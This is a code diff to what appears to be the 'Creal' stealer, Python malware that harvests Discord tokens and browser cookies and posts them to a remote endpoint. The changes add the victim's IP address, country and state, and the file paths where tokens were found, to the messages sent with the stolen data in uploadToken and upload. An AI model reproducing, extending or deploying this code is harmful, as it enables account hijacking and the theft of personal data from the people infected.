@@ -118,7 +118,7 @@ def globalInfo():
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    #sehir = ipdata["state"]
+    sehir = ipdata["state"]
 
     globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
     return globalinfo
@@ -391,7 +391,7 @@ def uploadToken(token, path):
     if nitro == '' and badge == '': nitro = "```None```"
 
     data = {
-        "content": f'`{path}`',
+        "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
             "color": 0000000,
@@ -460,7 +460,7 @@ def Reformat(listt):
     while "net" in e: e.remove("net")
     return list(set(e))
 
-def upload(name, link):
+def upload(name, link, path):
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -472,7 +472,7 @@ def upload(name, link):
             rrrrr = Reformat(str(cookiWords))
             rb = ' | '.join(da for da in rrrrr)
         data = {
-            "content": "",
+            "content": f"{globalInfo()} | {path}",
             "embeds": [
                 {
                     "title": "Creal | Cookies Stealer",
@@ -521,7 +521,7 @@ def upload(name, link):
 
     if name == "kiwi":
         data = {
-            "content": "",
+            "content": f"{globalInfo()}",
             "embeds": [
                 {
                 "color": 000000,
